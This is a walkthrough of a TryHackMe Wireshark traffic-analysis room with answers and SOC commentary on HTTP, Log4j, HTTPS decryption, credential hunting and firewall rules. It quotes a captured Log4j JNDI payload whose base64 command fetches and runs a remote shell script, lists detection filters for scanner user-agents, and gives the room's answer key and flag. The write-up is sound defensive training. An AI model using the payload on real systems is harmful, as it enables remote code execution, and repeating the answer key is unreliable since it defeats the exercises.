<img width="800" height="501" alt="chmod 777" src="https://github.com/user-attachments/assets/a047ce61-695f-407f-bf77-42dbfa59b351" />

---

## 🔥 EXTRA FROM ME: SOC Analyst Perspective on FTP Forensics
As a SOC Analyst, investigating FTP traffic in incident response rooms is a great exercise for understanding classic web attacks:

- **Why is uploading a file like `.php` via FTP a red flag?** When an attacker guesses weak credentials via FTP brute-force (which we saw with the 530 errors), their goal is to upload a web shell such as `n3td3v.php`. Because FTP is used to manage web directories, the uploaded file immediately becomes accessible via the browser (HTTP), giving the attacker full control over the server.
- **Importance of `SITE CHMOD` commands:** Commands like `SITE CHMOD 777` or similar permission modifications show that the attacker is trying to make the hidden file executable. In SIEM systems, the appearance of `SITE` commands in FTP traffic is immediately treated as a high-risk Indicator of Compromise (IOC).

---

# Task 7. 🛡️ Cleartext Protocol Analysis: HTTP

## 🌐 1. HTTP Analysis
HTTP (Hypertext Transfer Protocol) is a protocol based on cleartext (unencrypted text), with a request–response and client–server model.
It represents a standard type of network activity for requesting and serving web pages and is not blocked by default by the network perimeter.
Because it is unencrypted and is a pillar of web traffic, HTTP is one of the mandatory protocols to understand during traffic analysis.

With the help of HTTP analysis, the following attacks can be detected:
- Phishing pages
- Web attacks
- Data exfiltration
- Command and control traffic (C2)

**Note on HTTP2:**
HTTP2 is a revision of the HTTP protocol for better performance and security.
It supports binary data transfer and request & response multiplexing.

**Useful Wireshark filters in a "nutshell":**
- **Protocols:** `http`, `http2`
- **HTTP Request Methods:**
  - Methods: `GET`, `POST`
  - Filters: `http.request.method == "GET"`, `http.request.method == "POST"`, `http.request` (lists all requests)
- **HTTP Response Status Codes:**
  - `200 OK`: The request is successful.
  - `301 Moved Permanently`: The resource is permanently moved to a new URL/path.
  - `302 Moved Temporarily`: The resource is temporarily moved to a new URL/path.
  - `400 Bad Request`: The server did not understand the request.
  - `401 Unauthorised`: The URL requires authorization (login, etc.).
  - `403 Forbidden`: No access to the requested URL.
  - `404 Not Found`: The server cannot find the requested URL.
  - `405 Method Not Allowed`: The method used is not appropriate or is blocked.
  - `408 Request Timeout`: The request took longer than the server's wait time.
  - `500 Internal Server Error`: The request was not completed due to an unexpected error.
  - `503 Service Unavailable`: The request was not completed because the server or service is down/unavailable.
  - **Status filters:** `http.response.code == 200`, `http.response.code == 401`, `http.response.code == 403`, `http.response.code == 404`, `http.response.code == 405`, `http.response.code == 503`
- **HTTP Parameters (first set):**
  - **User agent:** Identification of the browser and operating system to the web server application.
  - **Request URI:** Indicates the requested resource from the server.
  - **Full URI:** Complete URI information (URI = Uniform Resource Identifier).
  - **Filters:** `http.user_agent contains "nmap"`, `http.request.uri contains "admin"`, `http.request.full_uri contains "admin"`
- **HTTP Parameters (second set):**
  - **Server:** Name of the server service.
  - **Host:** Hostname of the server.
  - **Connection:** Connection status.
  - **Line-based text data:** Cleartext data provided by the server.
  - **HTML Form URL Encoded:** Information from a web form.
  - **Filters:** `http.server contains "apache"`, `http.host contains "keyword"`, `http.host == "keyword"`, `http.connection == "Keep-Alive"`, `data-text-lines contains "keyword"`

---

## 🕵️‍♂️ 2. User Agent Analysis
As attackers use more sophisticated techniques to execute attacks, they try to leave traces similar to natural traffic through known and trusted protocols.
For a security analyst, it is important to notice signs of anomaly in parts of the packets.
The `user-agent` field is one of the good sources for spotting anomalies in HTTP traffic.
In some cases attackers successfully modify the `user-agent` data, so it can look very natural.

**Key rule:** A security analyst cannot rely solely on the `user-agent` field to detect an anomaly and should never whitelist a `user-agent`, even if it looks natural.
Detecting/hunting anomalies based on `user-agent` is an additional source of data and is useful when there is an obvious anomaly. If you are unsure about a value, you can do a web search to compare it with standard/normal `user-agent` values.

**What to look for (Research outcomes / low-hanging fruits):**
- Filter: `http.user_agent`
- Different `user-agent` information from the same host in a short time.
- Non-standard and custom `user-agent` information.
- Subtle spelling differences (e.g., `"Mozilla"` is not the same as `"Mozlilla"` or `"Mozlila"`).
- Information from auditing/scanning tools like Nmap, Nikto, Wfuzz, and sqlmap in the `user-agent` field.
- Payload data in the `user-agent` field.
- **Example combined filter:** `(http.user_agent contains "sqlmap") or (http.user_agent contains "Nmap") or (http.user_agent contains "Wfuzz") or (http.user_agent contains "Nikto")`

---

## ⚠️ 3. Log4j Analysis
A proper investigation starts with prior research of the threats and anomalies to be hunted.

**Key characteristics:**
- The attack starts with a `POST` request.
- There are known cleartext patterns: `jndi:ldap` and `Exploit.class`.

**Listed Wireshark filters:**
- `http.request.method == "POST"`
- `(ip contains "jndi") or (ip contains "Exploit")`
- `(frame contains "jndi") or (frame contains "Exploit")`
- `(http.user_agent contains "$") or (http.user_agent contains "==")`

---

## 🧪 4. Exercises and Questions in Task 7
The task states that detecting suspicious activity in parsed/chunked files is easy when you focus on details, and two files are used:

### `~/Desktop/exercise-pcaps/http/user-agent.pcap` for questions 1 and 2:

1. **Investigate the user agents. What is the number of anomalous "user-agent" types?**
   - **Answer:** `6`

<img width="1395" height="854" alt="user agent apply as column" src="https://github.com/user-attachments/assets/438284eb-48ed-4550-9b59-3187c397dd04" />

#### 🔍 1. Filtering Method in Wireshark
Open `~/Desktop/exercise-pcaps/http/user-agent.pcap` in Wireshark.
In the Display Filter bar above, enter:
`http.user_agent`
and press Enter.
Alternatively, click on any packet with `http.user_agent`, in the Packet Details section expand `Hypertext Transfer Protocol`, right-click on the `User-Agent: ...` field → `Apply as Column` (so a separate `User-Agent` column appears in the main packet table).

- `Mozilla/5.0 (Windows; U; Windows NT 6.4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.237 Safari/534.10`
- `Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)`
- `Wfuzz/2.4`
- `sqlmap/1.4#stable (http://sqlmap.org)`
- `${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}`
- `Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0`

#### 💻 2. Super-Fast Method via Terminal (`tshark`)
*(Note: In this task it cannot be done via AttackBox; this is an extra plus to have an idea that filtering `user-agent` can also be done via `tshark` in the terminal).*
Via the terminal on the machine, you can list all unique User-Agent strings from the file in one second. Example of how it would be:
`tshark -r ~/Desktop/exercise-pcaps/http/user-agent.pcap -Y "http.user_agent" -T fields -e http.user_agent | sort | uniq -c | sort -nr`
- `-r ...`: reads the `.pcap` file.
- `-Y "http.user_agent"`: filters only packets with User-Agent.
- `-T fields -e http.user_agent`: extracts only the text of the User-Agent field.
- `sort | uniq -c | sort -nr`: groups identical values and tells you how many times each type of User-Agent appears.

#### 🧠 3. How to Recognize Which Types are Anomalous (Analysis Reminder)
When you get the list of different User-Agent types, check these categories of anomalies:
- Known tools / scanners (e.g., `nmap`, `nikto`, `sqlmap`, `wfuzz`, `curl`, `python-requests`, etc. — depending on what is in the file).
- Subtle spelling differences in known names (e.g., misspelled Mozilla, like `Mozlilla` or `Mozlila`).
- Non-standard / strange / custom strings that do not look like a normal browser or legitimate client, or contain unusual symbols/payloads.

#### 🛡️ SOC Perspective
In practical analysis, counting unique anomalous types is very useful for quick triage: if you see 500 packets, but only a few different types of User-Agent are suspicious, you immediately know how many different tools or scripts hit the server.

2. **What is the packet number with a subtle spelling difference in the user agent field?**
   - **Answer:** `52`
   - `Mozlila` is misspelled instead of `Mozila`!

<img width="1390" height="854" alt="mozliza 52 " src="https://github.com/user-attachments/assets/86c895ca-19e4-4980-afb2-58daadd4847b" />

---

### `~/Desktop/exercise-pcaps/http/http.pcapng` for questions 3 and 4:

3. **Locate the "Log4j" attack starting phase. What is the packet number?**
   - We filter with `(ip contains "jndi") or (ip contains "Exploit")` and locate the packet number.
   - **Answer:** `444`

<img width="1387" height="855" alt="444 log4j" src="https://github.com/user-attachments/assets/911ecda2-df27-48a1-81da-c2d7e557ea5b" />

---

4. **Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude "{}").**
   - **Answer:** `62[.]210[.]130[.]250`
   - We copy the User Agent where the encoded base64 command is located.
   - We go to CyberChef, decode it with `From Base64`, and add `Defang IP Addresses`.

<img width="1387" height="858" alt="copy 444 log4j base64" src="https://github.com/user-attachments/assets/d0856b54-12bb-48a1-893f-0e2ba8493d6c" />

<img width="1898" height="617" alt="Screenshot 2026-11-20 052154_edited" src="https://github.com/user-attachments/assets/d34fd047-338f-4ca4-8740-72bb815e6860" />


*(Since these are local `.pcap` / `.pcapng` files in your lab machine, you read the exact packet numbers and decoded IP address directly from Wireshark when you open those two files).*

---

## 🔥 EXTRA FROM ME: Pentester & SOC Analyst Perspective
- **Why should you never whitelist a User-Agent?** Because `User-Agent` is an ordinary HTTP header sent by the client; an attacker can easily change it to a legitimate `Mozilla/5.0 ...` string. Therefore, in a SOC it is treated as an additional signal (for scanners, misspelled strings, or strange characters), not as proof that the traffic is safe.
- **How is the Log4j JNDI/Base64 pattern read in practice?** In Log4Shell/Log4j attempts, characteristic patterns (like `${jndi:ldap://...}` or similar expressions/encoded strings) are often seen in headers (for example `User-Agent` or other parameters) in `POST` requests. If there is a Base64 encoded part, once decoded, it can reveal a command, script, or external address/IP being contacted.
- **Defanged format:** When analysts share indicators (IoC) in reports or tickets so they are not clicked by accident or treated as an active link, IP addresses or URLs are often "defanged" (for example `192[.]168[.]1[.]10` or `hxxp://...` — follow the exact format required by the platform/task).
- **Connection to Splunk / SIEM that you practiced earlier:** The same way of thinking applies in both Wireshark and Splunk: first you filter method/parameter (`POST`, `http.user_agent`, `uri`), then you look for specific traces/anomalies (`$`, `==`, `jndi`, `Exploit`, misspelled Mozilla), and finally you correlate them with the response and further activity in the network.

Transport Layer Security is a cryptographic protocol that secures communications over a network. It provides authentication through the use of certificates, integrity by detecting tampering and confidentiality by encrypting the data.

---

# Task 8. 🛡️ Encrypted Protocol Analysis: Decrypting HTTPS

## 🔐 1. Why is Analysis of Decrypted HTTPS Traffic Important?
When investigating web traffic, analysts often encounter encrypted traffic due to the use of HTTPS (Hypertext Transfer Protocol Secure) for greater protection against spoofing, sniffing, and intercepting.

HTTPS uses the TLS protocol to encrypt communication, so it is not possible to decrypt the traffic and see the transferred data without possessing the appropriate encryption/decryption keys. Transport Layer Security is a cryptographic protocol that secures communications over a network. It provides authentication through the use of certificates, integrity by detecting tampering and confidentiality by encrypting the data.

Because this protocol offers a high level of security for transferring sensitive data, it is used by both attackers and malicious websites. Therefore, a security analyst must know how to use key files to decrypt encrypted traffic and investigate the activity.

When HTTP traffic is encrypted with TLS, packets in Wireshark look different (different colors), and protocol details and information (the real URL address and data returned by the server) are not fully visible.

---

## 🧰 2. Useful Wireshark Filters and TLS Handshake
Additional filters for HTTPS ("nutshell"):
- `http.request` — lists requests.
- `tls` — global search for TLS traffic.
- `tls.handshake.type == 1` — TLS Client Request (Client Hello).
- `tls.handshake.type == 2` — TLS Server response (Server Hello).
- `ssdp` — Local Simple Service Discovery Protocol (protocol for announcing and discovering network services).

**TLS Handshake (similar to TCP three-way handshake):**
The first two steps contain `Client Hello` and `Server Hello` messages.
The given filters help notice which IP addresses are involved in the TLS handshake process:
- **Client Hello:** `(http.request or tls.handshake.type == 1) and !(ssdp)`
- **Server Hello:** `(http.request or tls.handshake.type == 2) and !(ssdp)`

---

## 🗝️ 3. Encryption Key Log File (`SSLKEYLOGFILE`) and Decryption in Wireshark
- **What is an encryption key log file?** A text file containing unique key pairs for decrypting an encrypted traffic session.
- Those key pairs are automatically created (per session) when a connection is established with a website supporting SSL/TLS.
- Because these processes execute in the browser, you need to configure the system and use an appropriate browser (supported in Chrome and Firefox) to save these values into a key log file.
- You need to set an environment variable and create `SSLKEYLOGFILE`, whereby the browser writes the keys into that file while you browse the web.
- **Important rule regarding capture timing:** SSL/TLS key pairs are created per session at the moment the connection is established — therefore, the keys must be recorded during the traffic capture itself. Otherwise, it is not possible to create an appropriate key log file for decrypting already-captured traffic.
- **How to add/remove a key log file in Wireshark:**
  Via the right-click menu, or via `Edit` --> `Preferences` --> `Protocols` --> `TLS`.
- **What is seen after applying the key log file?**
  Traffic details become visible, and in the Packet Details and Bytes panels data is available in various formats for investigation (decompressed headers, details for HTTP2 packets, etc.).
  Depending on packet details, formats such as the following may appear:
  - `Frame`
  - `Decrypted TLS`
  - `Decompressed Header`
  - `Reassembled TCP`
  - `Reassembled SSL`

---

## 🧪 4. Practical Exercise and Questions in Task 8
The task uses the file `Desktop/exercise-pcaps/https/Exercise.pcap` and `KeysLogFile.txt`:

1. **What is the frame number of the "Client Hello" message sent to "accounts.google.com"?**
   - Filter with `tls.handshake.type == 1` (or `(http.request or tls.handshake.type == 1) and !(ssdp)`), check the Client Hello messages in Packet Details (`TLSv1.2 / TLSv1.3 Handshake Protocol → Extension: server_name → accounts.google.com`), and read the frame number (`Frame`).
   - **Answer:** `16`

<img width="1249" height="875" alt="servername 16 " src="https://github.com/user-attachments/assets/8991242d-52f4-46de-9836-76d1e9b74274" />

---

2. **Decrypt the traffic with the "KeysLogFile.txt" file. What is the number of HTTP2 packets?**
   - Set `KeysLogFile.txt` in Wireshark's TLS preferences (`Edit -> Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename`), then filter with `http2` and check the number of displayed HTTP2 packets (or see the count from statistics/filtered list).
   - **Answer:** `115`

<img width="1236" height="873" alt="Screenshot 2026-11-20 055337_edited" src="https://github.com/user-attachments/assets/27aa1a95-9fba-4e72-9a98-97f1d94e82d3" />

---

3. **Go to Frame 322. What is the authority header of the HTTP2 packet? (Enter the address in defanged format.)**
   - Go to Frame 322 (with `Ctrl+G` in Wireshark or click on the packet), open the decrypted HTTP2 details and look at the `:authority` header, then write it in defanged format (for example with `[.]` instead of `.`).
   - **Answer:** `safebrowsing[.]googleapis[.]com`
   - First we find the packet with `Go` then click `Find Packet` `322`, open in packet details in header `authority`, copy the value.
   - We go to CyberChef and choose `Defang URL`.

<img width="1370" height="866" alt="322 packet copy authority" src="https://github.com/user-attachments/assets/d27a7c08-dac7-4525-bec3-55f035c8ce07" />

<img width="1905" height="565" alt="defangURL" src="https://github.com/user-attachments/assets/23c9bbd8-31ca-41eb-8e49-233be4b2a27c" />

---

4. **Investigate the decrypted packets and find the flag! What is the flag?**
   - Review the decrypted HTTP packets to find the flag.
   - **Answer:** `FLAG{THM-PACKETMASTER}`

<img width="1387" height="843" alt="flag Http decrypted " src="https://github.com/user-attachments/assets/c26be803-69d3-4ecc-9b01-d05556afb2fb" />

---

### 1. Why is the flag in `http` (`text/plain`), and not only in encrypted traffic?
In a `.pcap` / `.pcapng` file, not all traffic has to be encrypted — there can also be plain HTTP traffic (which is why one of the filters in the lesson is precisely `http` and `data-text-lines`).
In the image we see:
- Packet 1637: `GET /filebin/f7c367c15581fe776cbb3b9eefe6bcd...`
- Packet 1644: `HTTP/1.1 200 OK (text/plain)` from `87.238.33.7` to `192.168.1.12`
- Below in `Line-based text data: text/plain (38 lines)` there is ASCII art with `FLAG{THM-PACKETMASTER}`.
The point of such tasks in Wireshark is often not to get stuck on just one filter (e.g., only `http2` or only `tls`), but after decrypting what can be decrypted, to search through textual HTTP responses and packet contents as well.

### 2. Easiest Way to Filter in Wireshark When Looking for a Flag or Important Text
Instead of clicking manually through hundreds of packets, use the Display Filter bar above with a combination of these simple filters:
- **Searching direct text / flag across all packets (`frame`):**
  `frame contains "FLAG{"`
  *(or just `frame contains "FLAG"` / `frame contains "THM{"` — with `frame` you search across the entire packet, regardless of whether it's in `http`, `http2`, `data-text-lines`, or another part).*
- **Filter only for HTTP responses returning content (`200 OK`):**
  `http.response.code == 200`
  This immediately narrows HTTP responses to those where the server actually returned something successful (`200 OK`), like packet 1644 in the image.
- **Searching in textual HTTP data:**
  `data-text-lines contains "FLAG"`
  Very useful when the server returns `text/plain`, HTML, JSON, or other readable text in the HTTP body (as seen in Packet Details in the image).
- **When there is both `http` and `http2`:**
  `http or http2`
  This way you see both classic HTTP and HTTP/2 packets in the same view.

* **💡 Practical trick for next exercises:**
  When you open a new `.pcap` / `.pcapng` and set the key (if any):
  - First check what the question asks for (e.g., Client Hello, number of `http2` packets, specific frame).
  - When a flag or hidden data in traffic is requested, always try `frame contains "FLAG"` (or `Find Packet` with `Ctrl+F` → `String` / `Packet bytes`). That in a few seconds shows you the exact packet where the text appears.

*(The exact values for these 4 questions are read directly from `Exercise.pcap` and `KeysLogFile.txt` on your machine).*

---

## 🔥 EXTRA FROM ME: SOC Analyst & Traffic Analysis Perspective
- **Why does `SSLKEYLOGFILE` work only if active during traffic capture?** In modern TLS (especially TLS 1.3), session keys are negotiated via ephemeral key exchange (like ECDHE) and are not extracted retroactively from a passive `.pcap` file using only the server's private key. Therefore, when analyzing from the client side in a lab or your own browser, `SSLKEYLOGFILE` must record the secrets at the moment the session happens.
- **What does `:authority` in HTTP/2 mean compared to `Host` in HTTP/1.1?** In HTTP/2, headers are binary and compressed (HPACK), and the pseudo-header `:authority` plays the role that the `Host` header had in HTTP/1.1 — it tells which host/domain (and possibly port) the request is directed to.
- **How is this used in a real SOC / Incident Response?** Although in a real corporate network you don't always have `SSLKEYLOGFILE` from every user, when analyzing your own tests, controlled browsers, malware sandbox/analysis, or TLS inspection, decrypting allows you to see what exactly was sent and returned inside the encrypted tunnel — domains, paths, headers, payloads, or signs of exfiltration/C2.

---

# 🛡️ Task 9: Bonus Hunt Cleartext Credentials!

## 🔑 1. Text Analysis: The Problem with Cleartext Credentials
In the previous exercises, we looked at how to inspect packets according to specific conditions and notice anomalies.
As mentioned at the very beginning of the room: Wireshark is **NOT** an IDS (Intrusion Detection System). Although Wireshark offers certain suggestions and warnings in the Expert Info section, it does not perform automatic blocking nor automatic sophisticated detection.

Sometimes anomalies mimic legitimate traffic, making detection much harder.
**Example with Brute-Force attacks:** When hunting for unencrypted credentials, in the packet list it is hard at first glance to tell whether multiple username/password entry attempts are part of a brute-force attack or a legitimate user who mistyped their password a few times.
Because everything is displayed at the single-packet level, detection speed increases drastically when the analyst can see all entered credentials as a complete list.

---

## 🧰 2. The `Tools --> Credentials` Feature in Wireshark
Wireshark has a built-in feature intended for analysts who want to quickly hunt cleartext credentials.
Specific Wireshark dissectors (such as FTP, HTTP, IMAP, POP, and SMTP) are programmed to automatically extract unencrypted passwords from the `.pcap` file.

**How to access:**
- **Version requirement:** This option is available only in Wireshark v3.1 and newer versions.
- **IMPORTANT SOC RULE:** Because this feature works only for certain protocols, you should never rely completely on it. A manual check of traffic is always recommended to be 100% sure there are no unnoticed credentials.

**What does the Credentials window show?**
When you open this option, a new interactive window opens displaying the extracted data:
- `Packet Number` (Packet number)
- `Protocol` (The protocol, e.g., HTTP, FTP)
- `Username` (The username)
- `Additional Information` (Additional information, including the password and the packet number containing the corresponding username).

**Interactivity:** The window is clickable! Clicking on the packet number immediately selects the packet with the password in Wireshark's main view, and clicking on the username selects the packet where the username was sent.

---

## 🧪 3. Exercise Analysis and Steps (`Bonus-exercise.pcap`)
To solve the two questions in `Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap`:
1. Open the file in Wireshark: `Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap`.
2. Go to the top menu: `Tools` → `Credentials`.
3. A window will open with extracted credentials for all supported protocols.

### ❓ Question 1:
**What is the packet number of the credentials using "HTTP Basic Auth"?**
- **How to find it:** We go to `Tools` then click `Credentials` and look in `Protocol` for `HTTP Basic auth`.
- Look at the `Packet Number` in the first column for that specific row.
- **Answer:** `237`

<img width="1368" height="850" alt="bonus 237 packet" src="https://github.com/user-attachments/assets/b0569635-f2c2-44f7-8236-e17798e9f631" />

---

### ❓ Question 2:
**What is the packet number where "empty password" was submitted?**
- **How to find it:** In the same `Credentials` window, review the column by clicking on the packet numbers and look in packet details for passwords/information. Find the row where the password is empty.
- Record the corresponding `Packet Number` for that packet.
- **Answer:** `170`

<img width="1364" height="860" alt="prazen pass 170" src="https://github.com/user-attachments/assets/11704f52-06c7-4ff8-91df-0052d75b8011" />

---

*(Note: You read the exact packet numbers directly from the Credentials window in your Wireshark).*

---

## 🔥 EXTRA FROM ME: SOC Analyst & Credential Hunting Perspective

### SOC Best Practice: Manual Cleartext Hunting
Although `Tools -> Credentials` is a great shortcut, attackers or non-standard web applications often use POST parameters in HTML forms that the dissector does not automatically recognize as standard HTTP Basic authentication.

1. **How to manually hunt credentials with filters (when the automatic tool doesn't catch them):**
   - **HTTP POST requests with forms:**
     `http.request.method == "POST" and (http contains "user" or http contains "pass" or http contains "login")`
   - **FTP authentication (User & Pass in cleartext):**
     `ftp.request.command == "USER" or ftp.request.command == "PASS"`
   - **HTTP Basic Authentication Header (Base64 encoded):**
     `http.authorization contains "Basic"`
     *(Trick: HTTP Basic Auth sends the string in the form `username:password` encoded in Base64. In Wireshark's Packet Details, if you expand the `Authorization: Basic ...` header, Wireshark automatically decodes it into plaintext for you!)*

2. **Difference between Brute-Force and Legitimate Traffic in Log Analysis:**
   - **Legitimate traffic:** A few individual POST requests with a certain time pause between them, followed by `HTTP 200 OK` or `302 Found` (successful login/redirect).
   - **Brute-Force / Credential Stuffing:** Dozens or hundreds of POST requests within a few seconds/minutes from the same IP address with hundreds of different passwords, where almost all return `HTTP 401 Unauthorized` or `200 OK` with a small response length (login error).
  
   - # 🛡️ Task 10: Bonus Actionable Results!

## ⚙️ 1. What Follows After You Discover the Anomaly?
- After you have investigated the traffic, detected the anomalies, and taken notes for further investigation, the next step comes: taking action.
- Not every investigation is led by a large team of security analysts; in certain cases, you must notice the anomaly yourself, identify the source, and take a concrete measure.
- Wireshark is not just for viewing packet details: it can help you create firewall rules ready for application in just a few clicks.

---

## 🧰 2. Firewall Rule Generation (`Tools --> Firewall ACL Rules`)
- **Accessing the feature in Wireshark:**

$$
\text{Tools} \longrightarrow \text{Firewall ACL Rules}
$$

- After selecting this option, a new window opens offering a combination of rules (based on IP address, port, and MAC address) for different purposes.
- **Key note from the lesson:** These rules are generated for application on the outside firewall interface.

### Supported firewall formats in Wireshark:
- Netfilter (iptables)
- Cisco IOS (standard/extended)
- IP Filter (ipfilter)
- IPFirewall (ipfw)
- Packet filter (pf)
- Windows Firewall (netsh new/old format)

---

## 🧪 3. Practical Steps and Questions (`Bonus-exercise.pcap`)
The file `Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap` is used.

### ❓ Question 1:
**Select packet number 99. Create a rule for "IPFirewall (ipfw)". What is the rule for "denying source IPv4 address"?**
- **Steps:**
  1. In `Bonus-exercise.pcap`, go to packet number 99 (`Ctrl+G` → `99` or click in the list).
  2. Open `Tools` → `Firewall ACL Rules`.
  3. In the rules window, focus on the `IPFirewall (ipfw)` section/format and look for the rule that blocks/denies (`deny`) the source IPv4 address of that packet.
- **Answer:** `add deny ip from 10.121.70.151 to any in`

<img width="922" height="851" alt="ip deny source " src="https://github.com/user-attachments/assets/8932c3aa-d9f4-4a92-9d14-c53d57ad5d50" />

---

### ❓ Question 2:
**Select packet number 231. Create "IPFirewall" rules. What is the rule for "allowing destination MAC address"?**
- **Steps:**
  1. Select packet number 231 in `Bonus-exercise.pcap`.
  2. Reopen `Tools` → `Firewall ACL Rules`.
  3. In the rules for `IPFirewall (ipfw)`, uncheck the `deny` field at the bottom and find the rule that allows (`allow`) the destination MAC address for packet 231.
- **Answer:** `add allow MAC 00:d0:59:aa:af:80 any in`

<img width="920" height="858" alt="allow Mac bonus final" src="https://github.com/user-attachments/assets/acb6d931-1eb7-4dfb-ae53-3386485dc88d" />

*(The exact generated lines for both questions are copied directly from the Firewall ACL Rules window in your Wireshark for packets 99 and 231.)*

---

## 🔥 EXTRA FROM ME: SOC Analyst & Incident Response Perspective
- **Why does the lesson emphasize "outside firewall interface" and why do you always check the direction (source vs destination)?**
  In network security, a rule applied to an outside interface may have a different in/out logic (`in` / `out`) than a rule on an inside interface or on the host itself.
  - Also, in `ipfw` there is a huge difference between MAC-layer rules (Layer 2 / Ethernet, such as `MAC any ...` for a destination MAC address) and IP-layer rules (Layer 3, such as `deny ip from <src-ip> to any`). If you get the direction (`from` vs `to`) or interface wrong, you can easily cut off legitimate traffic or fail to block the actual source.
- **The "Verify Before You Block" principle in a real SOC:**
  Before applying an IP address block in production, always verify whether that IP address is:
  - An external/attacker IP or a NAT / proxy / corporate gateway / internal service (so you don't accidentally block an entire office or an important service by mistake);
  - Confirmed by multiple signals (e.g., repeated failed attempts, anomalous User-Agent, suspicious POST, or C2/exfiltration).
- **Connection to the entire Incident Response cycle we learned:**
  Identification and analysis in Wireshark/SIEM → classification and triage → containment (e.g., quickly generating an ACL/firewall rule to mitigate the source) → recovery and post-mortem (documenting the steps, verifying if the rule worked, and updating playbooks and detection rules).

---

# 🏁 Task 11: Conclusion Wireshark: Traffic Analysis

## 🎉 1. Summary of the Completed Room
- With this task, you have successfully completed the "Wireshark: Traffic Analysis" room.
- Within this room, you learned how to use Wireshark for detecting anomalies and investigating events of interest at the packet level.

### Recommended challenge rooms to practice your Wireshark skills:
- Carnage
- Warzone 1
- Warzone 2

---

## 🧭 2. Why Wireshark is Only a Starting Point and Which Tools Follow?
- Wireshark is a great tool for starting a network security investigation, but it is not sufficient on its own for stopping threats.
- A security analyst should have knowledge of IDS/IPS (Intrusion Detection / Prevention Systems) and expanded skills with additional tools for detecting and preventing anomalies and threats.
- As attacks constantly become more sophisticated, using multiple tools and detection strategies becomes a necessity.

### Recommended next rooms for advancing in network traffic analysis and anomaly/threat detection:
- NetworkMiner
- Snort
- Snort Challenge - The Basics
- Snort Challenge - Live Attacks
- Zeek
- Zeek Exercises
- Brim

---

## 🔥 EXTRA FROM ME: How to Get the Maximum Out of These Next Steps
- **How do these tools complement each other in real SOC work?**
  - **Wireshark:** When you need deep micro-inspection of specific packets, handshakes, headers, or decrypted traffic.
  - **NetworkMiner:** Focused on extracting artifacts from `.pcap` (files, images, hosts, sessions, credentials) in a very visual and fast way.
  - **Snort:** A classic rule- and signature-based IDS/IPS engine, excellent for understanding how detection rules are written and how known or pattern-based traffic is blocked/alerted on.
  - **Zeek & Brim:** A powerful combination for structured network logs and querying large amounts of traffic (HTTP, DNS, SSL/TLS, connections, files) — much closer to how analysts search logs at the metadata and correlation level instead of reading every packet manually.
- **Suggested order (if you want to build step-by-step):**
  First, solidify your feel for traffic with a Wireshark challenge room (Carnage or Warzone 1), then transition to Zeek + Brim (or Snort), to see the difference between packet-by-packet analysis and log/rule analysis at a larger scale.
